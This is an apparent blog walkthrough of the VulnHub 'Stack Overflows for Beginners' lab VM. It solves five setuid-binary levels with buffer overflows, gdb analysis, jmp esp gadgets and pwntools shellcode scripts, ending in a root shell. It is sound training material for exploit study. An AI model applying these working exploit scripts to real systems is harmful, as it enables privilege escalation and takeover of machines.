---
title: Walkthrough of Stack Overflows for Beginners (1) - Vulnhub
excert: My first walkthrough!
header:
 teaser: https://www.vulnhub.com/media/img/entry/stackoverflows-00-thumb.png
tags:
 - Buffer Overflow
 - Shellcode
 - Stack
 - Binary
 - Walkthrough
category:
 - ctf
toc: true
classes: single
---

Hi all! 
Today we'll see the complete __Walkthrough of Stack Overflows for Beginners (1)__ from [VulnHub][1]

The goal is to read the file ```/root/root.txt```, walking through all the other 5 use, from level0 to level5(uid=0)

So let's start:

## Level 1

Once logged in with ```level0:level0``` we can see two interessting file insede the home directory:

```sh
-rwsr-xr-x  1 level1 level1 15600 Feb 22 12:35 levelOne
-rw-r--r--  1 root   root     406 Feb 22 12:43 levelOne.c
```

Clearly our objective is to exploit the ```levelOne``` executable to gain the privileges of the level1 user.

Opening up the source code we can see this code:

```c
    setuid(1001); 

    long key = 0x12345678;
    char buf[32];

    strcpy(buf, argv[1]);

    [...]

    if(key == 0x42424242) {
        execve("/bin/sh", 0, 0);
    }

```
So this binary simply gets the user inputs from the first argument and copy it to the ```key``` buffer, without cheking its length.

Ok, let's start the program like this:

```level0@kali:~$ ./levelOne BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB```

Hit enter and we are welcomed with a beautiful shell:

```sh
Buf is: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Key is: 0x42424242
$ id
uid=1001(level1) gid=1000(level0) groups=1000(level0)
$ cat /home/level1/level1.txt
a1e7076bbd600f4dccbc38aabcb12897
$ 
```
Good, let's **su-ing** to the next level!

## Level 2

In the home folder now we found only the complied, without the source code:

```sh
-rwsr-xr-x 1 level2 level2 15644 Feb 22 12:43 levelTwo
```

Let's grab [gdb-peda][2] for some nice gdb improvements!

```sh
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

Open it up with gdb and start decompile form the main function

```sh
level1@kali:~$ gdb ./levelTwo 

[...]

Reading symbols from ./levelTwo...(no debugging symbols found)...done.
gdb-peda$ pd main
Dump of assembler code for function main:
   0x00001247 <+0>:	lea    ecx,[esp+0x4]
   0x0000124b <+4>:	and    esp,0xfffffff0
   0x0000124e <+7>:	push   DWORD PTR [ecx-0x4]
   0x00001251 <+10>:	push   ebp
   0x00001252 <+11>:	mov    ebp,esp
   0x00001254 <+13>:	push   esi
   0x00001255 <+14>:	push   ebx
   0x00001256 <+15>:	push   ecx
   0x00001257 <+16>:	sub    esp,0xc
   0x0000125a <+19>:	call   0x1299 <__x86.get_pc_thunk.ax>
   0x0000125f <+24>:	add    eax,0x2da1
   0x00001264 <+29>:	mov    esi,ecx
   0x00001266 <+31>:	sub    esp,0xc
   0x00001269 <+34>:	push   0x0
   0x0000126b <+36>:	mov    ebx,eax
   0x0000126d <+38>:	call   0x1070 <setuid@plt>
   0x00001272 <+43>:	add    esp,0x10
   0x00001275 <+46>:	mov    eax,DWORD PTR [esi+0x4]
   0x00001278 <+49>:	add    eax,0x4
   0x0000127b <+52>:	mov    eax,DWORD PTR [eax]
   0x0000127d <+54>:	sub    esp,0xc
   0x00001280 <+57>:	push   eax
   0x00001281 <+58>:	call   0x1207 <hello>
   0x00001286 <+63>:	add    esp,0x10
   0x00001289 <+66>:	mov    eax,0x0
   0x0000128e <+71>:	lea    esp,[ebp-0xc]
   0x00001291 <+74>:	pop    ecx
   0x00001292 <+75>:	pop    ebx
   0x00001293 <+76>:	pop    esi
   0x00001294 <+77>:	pop    ebp
   0x00001295 <+78>:	lea    esp,[ecx-0x4]
   0x00001298 <+81>:	ret    
```
As we are expetting, the binary call the ```setuid``` function to run with the __level2's privileges__

Moving to the ```hello``` function we didn't find anythings ineteresting:

```sh
gdb-peda$ pd hello
Dump of assembler code for function hello:
   0x56556207 <+0>:	push   ebp
   0x56556208 <+1>:	mov    ebp,esp
   0x5655620a <+3>:	push   ebx
   0x5655620b <+4>:	sub    esp,0x24
   0x5655620e <+7>:	call   0x565560d0 <__x86.get_pc_thunk.bx>
   0x56556213 <+12>:	add    ebx,0x2ded
   0x56556219 <+18>:	sub    esp,0x8
   0x5655621c <+21>:	push   DWORD PTR [ebp+0x8]
   0x5655621f <+24>:	lea    eax,[ebp-0x20]
   0x56556222 <+27>:	push   eax
   0x56556223 <+28>:	call   0x56556040 <strcpy@plt>
   0x56556228 <+33>:	add    esp,0x10
   0x5655622b <+36>:	sub    esp,0x8
   0x5655622e <+39>:	lea    eax,[ebp-0x20]
   0x56556231 <+42>:	push   eax
   0x56556232 <+43>:	lea    eax,[ebx-0x1ff0]
   0x56556238 <+49>:	push   eax
   0x56556239 <+50>:	call   0x56556030 <printf@plt>
   0x5655623e <+55>:	add    esp,0x10
   0x56556241 <+58>:	nop
   0x56556242 <+59>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556245 <+62>:	leave  
   0x56556246 <+63>:	ret    
```

Mmm.. let's broswe other compiled functions included in the binary, just use ```info functions```

```sh
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00001000  _init
0x00001030  printf@plt
0x00001040  strcpy@plt
0x00001050  __libc_start_main@plt
0x00001060  execve@plt
0x00001070  setuid@plt
0x00001080  __cxa_finalize@plt
0x00001090  _start
0x000010d0  __x86.get_pc_thunk.bx
0x000010e0  deregister_tm_clones
0x00001120  register_tm_clones
0x00001170  __do_global_dtors_aux
0x000011c0  frame_dummy
0x000011c5  __x86.get_pc_thunk.dx
0x000011c9  spawn
0x00001207  hello
0x00001247  main
0x00001299  __x86.get_pc_thunk.ax
0x000012a0  __libc_csu_init
0x00001300  __libc_csu_fini
0x00001304  _fini
```

Hey! What's that ```spawn``` function??? Let's see!

```sh
gdb-peda$ pd spawn
Dump of assembler code for function spawn:
   0x000011c9 <+0>:	push   ebp
   0x000011ca <+1>:	mov    ebp,esp
   0x000011cc <+3>:	push   ebx
   0x000011cd <+4>:	sub    esp,0x4
   0x000011d0 <+7>:	call   0x10d0 <__x86.get_pc_thunk.bx>
   0x000011d5 <+12>:	add    ebx,0x2e2b
   0x000011db <+18>:	sub    esp,0xc
   0x000011de <+21>:	push   0x3ea
   0x000011e3 <+26>:	call   0x1070 <setuid@plt>
   0x000011e8 <+31>:	add    esp,0x10
   0x000011eb <+34>:	sub    esp,0x4
   0x000011ee <+37>:	push   0x0
   0x000011f0 <+39>:	push   0x0
   0x000011f2 <+41>:	lea    eax,[ebx-0x1ff8]
   0x000011f8 <+47>:	push   eax
   0x000011f9 <+48>:	call   0x1060 <execve@plt>
   0x000011fe <+53>:	add    esp,0x10
   0x00001201 <+56>:	nop
   0x00001202 <+57>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x00001205 <+60>:	leave  
   0x00001206 <+61>:	ret  
```

Ok, so this function calls ```execve```, maybe is our shell?? Ok, let's gather up all the information and proceed to find the bug!
Eventully, we find out that there is another buffer overflow in the hello function, allowing us to control the return pointer. That's good! So our aim is to make the program jump to the ```swap``` function.

First we need to find the padding to control the return pointer.
Go to [an online cyclic pattern generato][4], copy the string, open our target with gdb and run it with the string copied as inpunt argoment:

```sh
gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

[...]

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xcf 
EBX: 0x62413961 ('a9Ab')
ECX: 0x1 
EDX: 0xf7fa9890 --> 0x0 
ESI: 0xffffd210 [OMITTED]
EDI: 0xf7fa8000 --> 0x1d9d6c 
EBP: 0x31624130 ('0Ab1')
ESP: 0xffffd1d0 [OMITTED]
EIP: 0x41326241 ('Ab2A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41326241
[------------------------------------stack-------------------------------------]

[OMITTED]

[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41326241 in ?? ()
```
Ok, we sucessfully overwrite the return pointer, making the program jump to an unkonw address: just see the ```EIP``` register pointing to ```0x41326241 ('Ab2A')```.

Take this value and paste in the site where you compied the cyclic pattern: it should tell you that the paddind from start of our input to the return pointer is ```36 bytes```

Last thing we need to know where the spaw function lays: nothing more simple, just use ```pd spaw``` in gdb and copy the first address!
```c
   0x565561c9 <+0>:	push   ebp
``` 

Ok now we have all the informations to build our exploit!

We'll use the beautiful [PwnTools][3]: just lanch ```pip intall pwntools``` and wait the process to finish.
Now open up your preferred text editor and write something like this:

```python
#!/usr/bin/python2.7
from pwn import *

buf = ''
buf += "A" * 36
buf += p32(0x565561c9)

print buf
```

Make it executable with ```chmod +x [filename].py``` and run it with ```./levelTwo $(./exp.py)```, we are welcomed with a beautiful shell!

```sh
level1@kali:~$ ./levelTwo $(./exp.py)
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�aUV
$ id
uid=1002(level2) gid=1001(level1) groups=1001(level1)
$ cat /home/level2/level2.txt
c1a0794b6b8e4ad053e0263cfce223a4
```

Great! Move on with the next challenge!

## Level 3

Broswing the home folder we find our next target: ```levelThree```

Ok, re-install [gdb-peda][2] and the [pwntools][3], open it up in gdb and let's start from the main function:

```sh
gdb-peda$ pd main
Dump of assembler code for function main:
   0x00001202 <+0>:	lea    ecx,[esp+0x4]
   0x00001206 <+4>:	and    esp,0xfffffff0
   0x00001209 <+7>:	push   DWORD PTR [ecx-0x4]

   [...]

   0x0000122b <+41>:	call   0x1060 <setuid@plt>

   [...]

   0x0000123f <+61>:	call   0x11b9 <overflow>

   [...]

   0x00001256 <+84>:	ret    
```

Ok, same call of ```setuid``` and to ```overflow```... But this time, there is no ```spawn``` function! So, how we do this? A quick check with ```vmmap``` command from inside gdb...

```sh
gdb-peda$ vmmap
Start      End        Perm	Name
0x56555000 0x56558000 r-xp	/home/level2/levelThree
0x56558000 0x56559000 r-xp	/home/level2/levelThree
0x56559000 0x5655a000 rwxp	/home/level2/levelThree
0xf7dce000 0xf7de7000 r-xp	/usr/lib32/libc-2.28.so
0xf7de7000 0xf7fa5000 r-xp	/usr/lib32/libc-2.28.so
0xf7fa5000 0xf7fa6000 ---p	/usr/lib32/libc-2.28.so
0xf7fa6000 0xf7fa8000 r-xp	/usr/lib32/libc-2.28.so
0xf7fa8000 0xf7fa9000 rwxp	/usr/lib32/libc-2.28.so
0xf7fa9000 0xf7fac000 rwxp	mapped
0xf7fcd000 0xf7fcf000 rwxp	mapped
0xf7fcf000 0xf7fd2000 r--p	[vvar]
0xf7fd2000 0xf7fd4000 r-xp	[vdso]
0xf7fd4000 0xf7fd5000 r-xp	/usr/lib32/ld-2.28.so
0xf7fd5000 0xf7ffb000 r-xp	/usr/lib32/ld-2.28.so
0xf7ffc000 0xf7ffd000 r-xp	/usr/lib32/ld-2.28.so
0xf7ffd000 0xf7ffe000 rwxp	/usr/lib32/ld-2.28.so
0xfffdd000 0xffffe000 rwxp	[stack]
```

...and we find out that the stack is executable! Well, it's time to bring some shellcode! :wink: 

As before, we found out the padding to the return addres using the [cyclic pattern generator][4] to be of ```268 bytes```.

But how our program should execute the shellcode? Well, I tried the normal ```NOP-slide``` technique without any success, so instead we sill use a simple ```jmp esp``` gadget from somewhere in the code.

For this one, I used ```objdump``` with the flag ```-D```, this allow us to disasseble __ALL__ the code insede the libc: just trow this command in terminal ```objdump -D /usr/lib32/libc-2.28.so | grep jmp | grep esp``` and pick one of the address on the left.

Now some math: the addred we just copied is the __offest__ of that particular gadget, offset from the base address where the libc are loaded into the binary.
So, to know where exactly this gadget lies at runtime, we need to sum the base addre and the gadget's offset.
This base address can be obtained or with the ```vmmap``` command inside __gdb__ or with the ```ldd``` command inside terminal.

```sh
level2@kali:~$ ldd ./levelThree 
	linux-gate.so.1 (0xf7fd2000)
	libc.so.6 => /lib32/libc.so.6 (0xf7dc9000)
	/lib/ld-linux.so.2 (0xf7fd4000)
```
---
**UPDATE**
Never trust ```ldd```, sometime it simple displays the wrong address, it's safer use the address displayed by the gdb-peda's ```vmmap``` command, the first one on the left column on the first ```libc``` row: remember the ```libc``` are loaded at runtime, so you need to start and break the program to see the correct base address.

---

Take that addres beside libc and sum it: ```0xf7dc9000 + 0xbff7 = 0xf7dd4ff7```

Ok, we are ready to write down our exploit: open a text editor and 

1. Import pwntools 
2. Prepare the buffer with 268 bytes padding
3. Append the ```jmp esp``` gadget's address
4. Append your preferred shellcode (I used the one generated by the pwntool itself)

Now yout exploit should be like this:

```python
#!/usr/bin/python2.7

from pwn import *

buf = ""
buf += "A" * 268
buf += p32(0xf7dd4ff7) # jmp esp
buf += "\x90" * 10
buf += asm(shellcraft.i386.sh())

print buf
```

Run it with ```./levelThree $(./exp.py)``` and...

```sh
Buf: [REDACTED]
$ id
uid=1003(level3) gid=1002(level2) groups=1002(level2)
$ cat /home/level3/level3.txt
c303c0eaeb5f1afcc300a5cecf541083
$ 
```

Good! 

## Level 4

For this one, no comment: the solution is __EXACTLY__ the same as the previous level, you just need to adjust the padding to ```28 bytes```

```sh
level3@kali:~$ ./levelFour $(./exp.py)
Buf: [REDACTED]
$ id
uid=1004(level4) gid=1003(level3) groups=1003(level3)
$ cat /home/level4/level4.txt
f633cbb8f6a7ca2e0ac216b1dc2ad57a
$ 
```

## Level 5 (final)

This last challenge is a little bit different, the target input is not on the terminal arguments: once lunched the program, it asks for input and, same as before, there is a buffer overflow in the destination buffer.

So, thanks to the pwnlools, I change the same exploit of the previuos challenge, using the ```process' pipe``` to redirect the IO of my buffer

```python
#!/usr/bin/python2.7
from pwn import *

p = process("./levelFive")

buf = ''
buf += 'A' * 16

buf += p32(0xf7dd4ff7) # jmp esp
buf += asm(shellcraft.i386.linux.sh())

p.sendline(buf)
p.interactive()
```

..and immediatly I get a shell! Amazing! 

```sh
level4@kali:~$ ./shell.py 
[+] Starting local process './levelFive': pid 7418
[*] Switching to interactive mode
Enter your input: Buf: [REDACTED]
$ id
uid=1004(level4) gid=1004(level4) groups=1004(level4)
$ cat /root/root.txt
cat: /root/root.txt: Permission denied
$ 
```

W00T! Why we can't read that file? Why we are not root?? :sob:

Analizing the main function into gdb, we eventually find out that this time the code __does not__ call the ```setuid``` function, preventing our shell to run as root.

Nothing more simple to solve! Thanks to the __p0w3r!__ of the pwntool, we can just use another shellcode rigth before the shell's one to call ```setuid```!

So add the ```shellcraft.i386.linux.setreuid()``` generated shellcode into the buffer, as the first one called.
Now the exploit should looks like this:

```python
#!/usr/bin/python2.7

from pwn import *

p = process("./levelFive")

buf = ''
buf += 'A' * 16

buf += p32(0xF7F059C6) # 0x001379c6: push esp; ret;
buf += asm(shellcraft.i386.linux.setreuid())
buf += asm(shellcraft.i386.linux.sh())

p.sendline(buf)
p.interactive()
```

Run it, and...

```sh
level4@kali:~$ ./shell.py 
[+] Starting local process './levelFive': pid 7497
[*] Switching to interactive mode
Enter your input: Buf: [REDACTED]
$ id
uid=0(root) gid=1004(level4) groups=1004(level4)
$ cat /root/root.txt
6fabdaa465082fb1c32e915aced6a568
$ 
```

BOOM! G0tR00T!

## Final thoughts 

There are still some questions in my mind..

~~First of all, why the Ret-to-libc gadget works? I mean, the binary is compiled with the ```PIE``` enabled, so theoretically the libc's base address should be randomized at every run, but this is not the case 'cause our exploit works fine.~~

**UPDATE** The ```PIE``` mechanism works only the the binary's base address, leaving the libc's base intact.. that's why my exploit works - my bad :smile: 

Second why should be so many ```jmp esp``` instructions inside libc? In wich cases these intructions are usefull? :confused:
I never heard about a situation where a procedure inside the libc would jumps to its stack pointer, this means that libc can run program in memory region that can be written too?? 

If anybody know, please write a comment below or reach me on [Twitter][5]

Anyway, this VM is a good introduction to binary exploitation, I would like to see something different from level3 and on, especially challenges that would require differents exploting techniques. :bowtie:

---
[1]: https://www.vulnhub.com/entry/stack-overflows-for-beginners-1,290/
[2]: https://github.com/longld/peda
[3]: https://github.com/Gallopsled/pwntools
[4]: https://wiremask.eu/tools/buffer-overflow-pattern-generator/
[5]: https://twitter.com/MrMoDDoM